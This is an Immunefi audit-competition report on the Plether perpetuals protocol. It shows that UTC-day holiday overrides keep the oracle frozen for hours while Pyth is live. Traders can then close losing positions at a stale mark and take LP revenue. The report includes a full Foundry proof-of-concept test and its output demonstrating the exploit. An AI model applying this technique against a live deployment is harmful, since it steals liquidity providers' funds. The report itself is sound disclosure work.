# \#98239 [SC-Medium] holiday overrides keep stale-mark pricing through up to 22 hours of live Pyth trading, letting traders exit losing positions at the pre-holiday price and steal LP yield

**Submitted on Nov 6th 2026 at 07:56:37 UTC by @farismaulana for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98239
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

holiday overrides freeze the oracle for a whole UTC day, but FX holidays do not start or end at UTC midnight. Pyth's FX feeds close on 24 Dec and 31 Dec at 17:00 New York and reopen at midnight New York, 22:00 to 05:00 UTC. no UTC day matches that closure, so the override the docs require for it keeps the protocol frozen for 17 to 22 hours while Pyth publishes live prices.

while frozen, every close settles at the Engine's stored pre-holiday mark and pays only a fixed 50 bps spread. a trader whose position has moved against it by more than 50 bps closes at the stale mark and keeps the rest of the move, which belongs to the LPs. in the PoC, on Christmas 2026, a 400_000 USDG LONG facing a 100 bps live move keeps 2_000.953891 USDG.

## Vulnerability Details

overrides are stored and looked up as UTC day numbers, and an override day returns `oracleFrozen = true` regardless of the 17:00 New York boundary the weekly calendar uses (`MarketCalendarLib.sol:38-49`):

```solidity
// CfdEngine.sol, applyCalendarConfig
@>          uint256 day = config.fadDayTimestamps[i] / 86_400;

// CfdEngine.sol, _marketStatus
@>      uint256 today = timestamp / 86_400;
        return planner.marketCalendarStatus(timestamp, fadDayOverrides[today], fadDayOverrides[today + 1], fadRunwaySeconds);

// MarketCalendarLib.sol, marketStatus
@>      if (todayOverride) {
@>          return (true, true);
        }
```

while frozen, the oracle discards the caller's signed Pyth update, replays the stored mark, and fills a close without the adverse-confidence shift:

```solidity
// PletherOracle.sol, _resolveCurrentBasket
@>      if (policy.oracleFrozen) {
@>          return _frozenBasket(mode, policy.maxStaleness); // basket.price = engine.lastMarkPrice()
        }

// PletherOracle.sol, _orderExecutionPrice
@>      if (oracleFrozen && request.isClose) {
@>          return price;
        }
```

the close pays only the fixed spread on its notional (`CloseAccountingLib.sol:122-123`). keeper mark refreshes in the window change nothing: the frozen basket returns the stored mark and time (`PletherOracle.sol:733-734`), so the engine mark stays at the pre-holiday value.

every step is routine; none needs a mistaken or malicious admin:

1. governance registers the holiday as a UTC-day override, as the docs require: holiday hours "still require governance-configured UTC-day overrides" (`SECURITY.md:1337-1338`). the change passes the 72-hour timelock (`SECURITY.md:95`) with the release 1 hour runway (`DEPLOYMENT.md:145`).
2. Pyth reopens and publishes live prices while the protocol is still frozen.
3. a trader commits a close and executes it itself. frozen closes "replay the Engine's stored mark ... They do not parse live data" (`ORACLE_SYNCHRONIZATION.md:72-73`) and pay a spread that "Does not vary with ... elapsed closure time or mark staleness" (docs site).

### how long the window is

Pyth's market hours for all six basket feeds:

```
America/New_York;O,O,O,O,0000-1700,C,1700-2400;1224/0000-1700,1231/0000-1700
```

the 24 Dec and 31 Dec holiday hours run 22:00 to 05:00 UTC. either UTC day governance can register freezes live trading:

| override day | frozen while Pyth is live |
|---|---|
| 25 Dec / 1 Jan | 05:00 to 24:00 UTC, 19 hours (17 hours on a Friday, when the weekly freeze starts at 22:00 UTC) |
| 24 Dec / 31 Dec | 00:00 to 22:00 UTC, 22 hours |

the PoC uses 25 Dec 2026, a Friday: 17 hours.

### the disclosures cover real closures, not live trading

`SECURITY.md:1331-1338` accepts that "a fixed spread deliberately does not increase with mark staleness inside the permitted frozen window", and requires UTC-day overrides for holiday hours. that trade-off is scoped to real closures: "preserve close and liquidation liveness during real closures without weakening live-market MEV protections" (`SECURITY.md:845`). nothing discloses that the override keeps the frozen window open through 17 to 22 hours of live trading. the docs site describes the same behaviour ("The entire UTC day is close-only / Oracle-frozen policy is active") with one caveat, that UTC closure days "may not be exact to the minute". that caveat is framed in minutes.

the design treats frozen pricing as closure-only. the stored mark is used "while Pyth is closed" (`PletherOracle.sol:741`), "Only the intervening closure interval uses frozen-oracle policy" (`WHITEPAPER.md:1118`), and the weekly freeze tracks the Pyth boundary to the second (`MarketCalendarLib.sol:38-49`). commit `90915d97` ("Separate FAD risk window from oracle-frozen window to close Friday arb gap") fixed "a 3-hour Friday window (19:00-22:00) where Pyth feeds are still live but MEV checks were bypassed", and made override days oracle-frozen on the premise "On admin days the oracle is assumed offline". on Pyth's holiday schedule the oracle is online for most of the override day.

### example

a trader holds a 400_000 USDG LONG opened at 1.00000000 before the Thursday 24 Dec 2026 close. at 06:00 UTC on 25 Dec Pyth shows the basket at 1.01000000, 100 bps against the LONG (a LONG gains when the basket falls).

- live close: the trader pays the 100 bps loss, 4_000 USDG, to the LPs.
- close in the override window: the fill is the stored 1.00000000 mark, and the trader pays only the 50 bps spread, 2_000 USDG.

## Impact Details

LP trading revenue is stolen. every trader holding a position through a registered holiday gets a free option over the window: whenever the live move against it passes 50 bps, it closes at the pre-holiday mark and moves `notional * (|move| - 50 bps)` of LP revenue to itself, using only public Pyth prices and an ordinary close. in the PoC 2_000.953891 USDG of the trader's realized loss, owed to the pool, never reaches it. the loss scales with open interest, the size of the live move and the length of the window, and repeats on every registered holiday.

## References

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L689-L706

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L887-L907

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarketCalendarLib.sol#L38-L53

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L743

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L749-L756

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L930-L941

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L120-L124

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L95

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L843-L845

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1331-L1338

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1115-L1120

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ORACLE_SYNCHRONIZATION.md?plain=1#L72-L73

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L145

https://github.com/immunefi-team/audit-comp-plether/commit/90915d9779d363756436292a71a640e4701b35e3

https://docs.plether.com/how-plether-works/market-states-and-oracle-closures

https://hermes.pyth.network/v2/price_feeds?asset_type=fx

## Proof of Concept

## Proof of Concept

the test runs on the repo's `BasePerpTest` harness with the release risk and router parameters from `DEPLOYMENT.md`, on Christmas 2026 and Pyth's published schedule. a control branch runs the same history without the override:

1. Tue 15 Dec: governance proposes 25 Dec 2026 as a closure day (1 hour runway); the attack branch finalizes it after the timelock.
2. Mon 21 Dec: an honest Junior LP deposits 1_000_000 USDG.
3. Thu 24 Dec 20:00 UTC: the trader opens a 400_000 USDG LONG at 1.00000000 with 20_000 USDG margin. the last live mark is 21:59 UTC.
4. Fri 25 Dec 05:30 UTC, after the 05:00 UTC Pyth reopen: a keeper pushes the live basket at 1.01000000.
5. Fri 25 Dec 06:00 UTC: the trader commits its full close and executes it itself with a signed Pyth update at 1.01000000.
6. Fri 25 Dec 21:59 UTC, before the weekly freeze: a keeper pushes the live basket again.

create `packages/perps/test/poc/HolidayOverrideStaleExit2026.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Doc-conformant holiday override on the next real occurrence, Christmas 2026, using Pyth's published FX
///         schedule for all six basket feeds:
///         `America/New_York;O,O,O,O,0000-1700,C,1700-2400;1224/0000-1700,1231/0000-1700`.
///         Pyth closes Thursday 24 Dec 2026 at 17:00 New York (22:00 UTC) and reopens Friday 25 Dec at 00:00 New York
///         (05:00 UTC). Governance registers 25 Dec as a UTC-day closure, as the docs describe ("The entire UTC day is
///         close-only / Oracle-frozen policy is active"). The override freezes 00:00-24:00 UTC (CfdEngine.sol:897-906,
///         MarketCalendarLib.sol:51-52), so from the 05:00 UTC reopen until the weekly Friday freeze at 22:00 UTC the
///         protocol replays the Thursday 21:59 UTC mark while Pyth publishes live prices: 17 hours.
///         During that window a keeper's live mark push is accepted but ignored (PletherOracle.sol:754-755 returns the
///         stored mark, CfdEngine.sol:1472 accepts the equal timestamp), and a close fills at the stored mark
///         (PletherOracle.sol:733, :937-938) for the fixed frozen spread (CloseAccountingLib.sol:122-123).
///         Release risk/router parameters (packages/perps/DEPLOYMENT.md). Calendar override set through the timelocked
///         engine admin. Every trader/keeper call is a production entry point.
contract HolidayOverrideStaleExit2026Test is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // honest Junior LP
    address internal constant TRADER = address(0xBAD);
    address internal constant KEEPER = address(0xFEE0);

    uint256 internal constant P0 = 100_000_000; // 1.00000000, Thu 24 Dec 17:00 New York close
    uint256 internal constant P_LIVE = 101_000_000; // 1.01000000, live basket after the Fri 05:00 UTC reopen (+100 bps, adverse to LONG)
    uint256 internal constant SIZE = 400_000e18; // 400_000 USDG notional at 1.00
    uint256 internal constant MARGIN = 20_000e6; // 20_000 USDG, 5% of notional, above the 3% FAD margin
    uint256 internal constant HONEST_JUNIOR = 1_000_000e6; // 1_000_000 USDG

    uint256 internal constant TUE_15_DEC_2026_1400 = 1_797_343_200;
    uint256 internal constant MON_21_DEC_2026_1400 = 1_797_861_600;
    uint256 internal constant THU_24_DEC_2026_2000 = 1_798_142_400;
    uint256 internal constant THU_24_DEC_2026_2159 = 1_798_149_540; // last live tick before Pyth's 17:00 NY (22:00 UTC) close
    uint256 internal constant FRI_25_DEC_2026_0000 = 1_798_156_800; // registered closure day (UTC)
    uint256 internal constant FRI_25_DEC_2026_0530 = 1_798_176_600; // Pyth reopened at 05:00 UTC; keeper pushes live mark
    uint256 internal constant FRI_25_DEC_2026_0600 = 1_798_178_400; // trader closes
    uint256 internal constant FRI_25_DEC_2026_2159 = 1_798_235_940; // last minute before the weekly Friday 22:00 UTC freeze

    uint256 internal clientNonce;

    struct Branch {
        uint256 traderWealth;
        uint256 poolAssets;
        uint256 markAfterPush; // engine mark after the 05:30 UTC keeper push
        uint64 markTimeAfterPush;
        uint256 markAfterClose;
        uint256 markAtFri2159; // engine mark after the 21:59 UTC keeper push
        uint64 markTimeAtFri2159;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.maxExecutionWindowSeconds = 60;
        rc.orderExecutionStalenessLimit = 60;
        rc.liquidationStalenessLimit = 15;
        rc.basketMaxConfidenceRatioBps = 10;
        rc.orderSettlementWindow = 15;
        rc.maxComponentPublishTimeDivergence = 5;
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.minOpenNotionalAssets = 1000e6;
        rc.openOrderExecutionBountyBps = 1;
        rc.minOpenOrderExecutionBountyAssets = 10_000;
        rc.maxOpenOrderExecutionBountyAssets = 200_000;
        rc.positionProtectionTriggerBountyAssets = 200_000;
        rc.maxPendingOrders = 5;
        rc.maxPruneOrdersPerCall = 64;
        _setRouterConfig(rc);

        settlementToken.mint(TRADER, MARGIN + 50_000e6);
        vm.startPrank(TRADER);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(TRADER, MARGIN + 50_000e6);
        vm.stopPrank();
    }

    // ------------------------------------------------------------------ helpers

    function _step(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _payload(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory u) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ups = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ups[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(int256(price)),
                    conf: 0,
                    expo: int32(-8),
                    publishTime: publishTime,
                    prevPublishTime: publishTime - 1
                })
            });
        }
        u = new bytes[](1);
        u[0] = abi.encode(ups);
    }

    function _markAt(
        uint256 price,
        uint256 t
    ) internal {
        _step(t);
        vm.prank(KEEPER);
        router.updateMarkPrice(_payload(price, t));
    }

    function _logMark(
        string memory label
    ) internal view {
        console2.log(label);
        console2.log("    oracleFrozen ", engine.isOracleFrozen());
        console2.log("    lastMarkPrice", engine.lastMarkPrice());
        console2.log("    lastMarkTime ", uint256(engine.lastMarkTime()));
    }

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 id = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _step(vault.depositEpochStart(id) + 1);
        _step(vm.getBlockTimestamp() + 1);
        vm.prank(KEEPER);
        router.settleLpEpoch(_payload(P0, vm.getBlockTimestamp()));
        uint256 claimable = vault.claimableDepositRequest(id, lp);
        vm.prank(lp);
        vault.claimDeposit(id, claimable, lp, lp);
    }

    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("holiday-override-2026", ++clientNonce));
        r.side = side;
        r.sizeDelta = sizeDelta;
        r.marginDelta = marginDelta;
        r.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        r.isClose = isClose;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _traderWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(TRADER) + clearinghouse.balanceAssets(TRADER);
    }

    /// @dev Shared history from Monday 21 Dec 2026 through Friday 25 Dec 21:59 UTC.
    function _runFromMonday() internal returns (Branch memory b) {
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        // Monday 21 Dec, live: honest Junior LP funds the pool.
        _markAt(P0, MON_21_DEC_2026_1400);
        settlementToken.mint(ALICE, HONEST_JUNIOR);
        _lpDeposit(juniorVault, ALICE, HONEST_JUNIOR);

        // Thursday 24 Dec 20:00 UTC, live: trader opens a 400_000 USDG LONG at 1.00.
        _markAt(P0, THU_24_DEC_2026_2000);
        OrderV3Types.OrderRequest memory openReq = _request(CfdTypes.Side.LONG, SIZE, MARGIN, false);
        vm.prank(TRADER);
        uint64 openId = router.commitOrder(openReq);
        _step(THU_24_DEC_2026_2000 + 1);
        vm.prank(KEEPER);
        router.executeOrder(openId, _payload(P0, THU_24_DEC_2026_2000 + 1));
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, SIZE, "open filled");

        // Last live tick before Pyth's 17:00 New York close (22:00 UTC).
        _markAt(P0, THU_24_DEC_2026_2159);
        _logMark("[Thu 24 Dec 21:59 UTC] last live tick before Pyth close");

        // Friday 25 Dec 05:30 UTC. Pyth reopened at 00:00 New York (05:00 UTC) with the basket 100 bps higher.
        // A keeper pushes the live basket.
        _markAt(P_LIVE, FRI_25_DEC_2026_0530);
        _logMark("[Fri 25 Dec 05:30 UTC] after keeper pushes live 1.01000000");
        b.markAfterPush = engine.lastMarkPrice();
        b.markTimeAfterPush = engine.lastMarkTime();

        // Friday 25 Dec 06:00 UTC. The trader commits its full close and executes it with the live Pyth update.
        _step(FRI_25_DEC_2026_0600);
        OrderV3Types.OrderRequest memory closeReq = _request(CfdTypes.Side.LONG, SIZE, 0, true);
        vm.prank(TRADER);
        uint64 closeId = router.commitOrder(closeReq);
        _step(FRI_25_DEC_2026_0600 + 1);
        vm.prank(TRADER); // the trader runs its own close
        router.executeOrder(closeId, _payload(P_LIVE, FRI_25_DEC_2026_0600 + 1));
        (size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 0, "close executed");
        _logMark("[Fri 25 Dec 06:00 UTC] after trader close");
        b.markAfterClose = engine.lastMarkPrice();

        b.traderWealth = _traderWealth();
        b.poolAssets = pool.totalAssets();
        console2.log("    treasury credit this branch", clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore);

        // Friday 25 Dec 21:59 UTC, one minute before the weekly freeze. A keeper pushes the live basket again.
        _markAt(P_LIVE, FRI_25_DEC_2026_2159);
        _logMark("[Fri 25 Dec 21:59 UTC] after keeper pushes live 1.01000000");
        b.markAtFri2159 = engine.lastMarkPrice();
        b.markTimeAtFri2159 = engine.lastMarkTime();
    }

    // ------------------------------------------------------------------ test

    /// @notice Same history in both branches; the only difference is whether governance registered 25 Dec 2026 as a
    ///         UTC-day closure, as the docs describe. With it, the live Pyth basket is ignored for the whole
    ///         05:00-22:00 UTC session and a 06:00 UTC close settles at the stale Thursday mark.
    function test_holidayOverride2026_closesAtStaleMarkWhilePythIsLive() public {
        _step(TUE_15_DEC_2026_1400);
        _markAt(P0, TUE_15_DEC_2026_1400 + 1);
        ICfdEngineAdminHost.EngineCalendarConfig memory cal;
        cal.fadDayTimestamps = new uint256[](1);
        cal.fadDayTimestamps[0] = FRI_25_DEC_2026_0000;
        cal.fadRunwaySeconds = 1 hours;
        engineAdmin.proposeCalendarConfig(cal);

        _step(MON_21_DEC_2026_1400 - 1 hours);
        uint256 snap = vm.snapshotState();

        // Control: no override. Friday 25 Dec 05:00-22:00 UTC is ordinary live trading, matching Pyth.
        console2.log("===== control: no override =====");
        Branch memory live = _runFromMonday();
        assertEq(live.markAfterPush, P_LIVE, "control: keeper push accepted");
        assertEq(live.markTimeAfterPush, FRI_25_DEC_2026_0530, "control: mark time advances");
        assertEq(live.markAfterClose, P_LIVE, "control: close priced at the live basket");

        // Attack: the override is finalized through the timelock.
        vm.revertToState(snap);
        engineAdmin.finalizeCalendarConfig();
        console2.log("===== override: 25 Dec 2026 registered =====");
        Branch memory stale = _runFromMonday();

        console2.log("===== summary =====");
        console2.log("trader wealth, override (stale exit) ", stale.traderWealth);
        console2.log("trader wealth, live close            ", live.traderWealth);
        console2.log("trader gain from stale exit          ", stale.traderWealth - live.traderWealth);
        console2.log("pool assets, override                ", stale.poolAssets);
        console2.log("pool assets, live close              ", live.poolAssets);
        console2.log("LP loss from stale exit              ", live.poolAssets - stale.poolAssets);

        // Live pushes are accepted but ignored for the whole Pyth session; the mark stays at Thursday 21:59 UTC.
        assertEq(stale.markAfterPush, P0, "override: 05:30 keeper push ignored");
        assertEq(stale.markTimeAfterPush, THU_24_DEC_2026_2159, "override: mark time frozen at Thursday close");
        assertEq(stale.markAfterClose, P0, "override: close filled at the stale mark");
        assertEq(stale.markAtFri2159, P0, "override: still stale one minute before the weekly freeze");
        assertEq(stale.markTimeAtFri2159, THU_24_DEC_2026_2159, "override: no live mark all session");
        assertEq(live.markTimeAtFri2159, FRI_25_DEC_2026_2159, "control: mark tracks Pyth all session");

        assertGt(stale.traderWealth, live.traderWealth, "trader exits at the stale mark and avoids most of the 100 bps move");
        assertLt(stale.poolAssets, live.poolAssets, "LPs lose the move they would have collected at the live price");
    }

}
```

run from `packages/perps`:

```bash
forge test --match-test test_holidayOverride2026_closesAtStaleMarkWhilePythIsLive -vv
```

output:

```bash
Ran 1 test for test/poc/HolidayOverrideStaleExit2026.t.sol:HolidayOverrideStaleExit2026Test
[PASS] test_holidayOverride2026_closesAtStaleMarkWhilePythIsLive() (gas: 10625984)
Logs:
  ===== control: no override =====
  [Thu 24 Dec 21:59 UTC] last live tick before Pyth close
      oracleFrozen  false
      lastMarkPrice 100000000
      lastMarkTime  1798149540
  [Fri 25 Dec 05:30 UTC] after keeper pushes live 1.01000000
      oracleFrozen  false
      lastMarkPrice 101000000
      lastMarkTime  1798176600
  [Fri 25 Dec 06:00 UTC] after trader close
      oracleFrozen  false
      lastMarkPrice 101000000
      lastMarkTime  1798178401
      treasury credit this branch 160000000
  [Fri 25 Dec 21:59 UTC] after keeper pushes live 1.01000000
      oracleFrozen  false
      lastMarkPrice 101000000
      lastMarkTime  1798235940
  ===== override: 25 Dec 2026 registered =====
  [Thu 24 Dec 21:59 UTC] last live tick before Pyth close
      oracleFrozen  false
      lastMarkPrice 100000000
      lastMarkTime  1798149540
  [Fri 25 Dec 05:30 UTC] after keeper pushes live 1.01000000
      oracleFrozen  true
      lastMarkPrice 100000000
      lastMarkTime  1798149540
  [Fri 25 Dec 06:00 UTC] after trader close
      oracleFrozen  true
      lastMarkPrice 100000000
      lastMarkTime  1798149540
      treasury credit this branch 320000000
  [Fri 25 Dec 21:59 UTC] after keeper pushes live 1.01000000
      oracleFrozen  true
      lastMarkPrice 100000000
      lastMarkTime  1798149540
  ===== summary =====
  trader wealth, override (stale exit)  67670860618
  trader wealth, live close             65669906727
  trader gain from stale exit           2000953891
  pool assets, override                 1002010939382
  pool assets, live close               1004171893273
  LP loss from stale exit               2160953891

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 23.23ms (16.80ms CPU time)
```

in the control branch every keeper push moves the engine mark to the live basket and the close fills at 1.01000000. under the override, both keeper pushes succeed but leave the mark at 1.00000000 with `lastMarkTime` 1798149540 (Thu 24 Dec 21:59 UTC) for the whole 17-hour Pyth session, and the close fills at that stale mark.

the trader ends 2_000.953891 USDG richer than the live close. the pool ends 2_160.953891 USDG poorer; 160 USDG of that is the close execution fee, which the treasury collects under the override and the pool keeps in the live close.
